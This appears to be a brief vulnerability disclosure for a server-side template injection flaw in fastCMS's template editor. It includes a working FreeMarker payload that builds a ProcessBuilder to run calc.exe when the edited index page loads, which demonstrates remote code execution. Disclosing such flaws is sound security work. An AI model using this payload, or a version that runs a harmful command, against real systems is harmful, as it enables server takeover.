There is a Server Side Template Injection vulnerability in the template editing function of the fastCMS system.Click the edit button in the template menu to edit index.html.  
<img width="415" alt="image" src="https://github.com/biantaibao/fastcms_Sever-side-Template-injection/assets/131763503/a3d9bbb3-3fab-49ac-a208-c515955fc19a">  
payload:<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc.exe").start()}  
poc:  
![image](https://github.com/biantaibao/fastcms_Sever-side-Template-injection/assets/131763503/44b60489-e477-4c04-9852-e104958dc621)  
When we access the index.xml page, this command is triggered, causing a remote code execution vulnerability.  
http://localhost:8080/index   
![image](https://github.com/biantaibao/fastcms_Sever-side-Template-injection/assets/131763503/072b7c37-952f-4f94-a129-92020f6feaea)



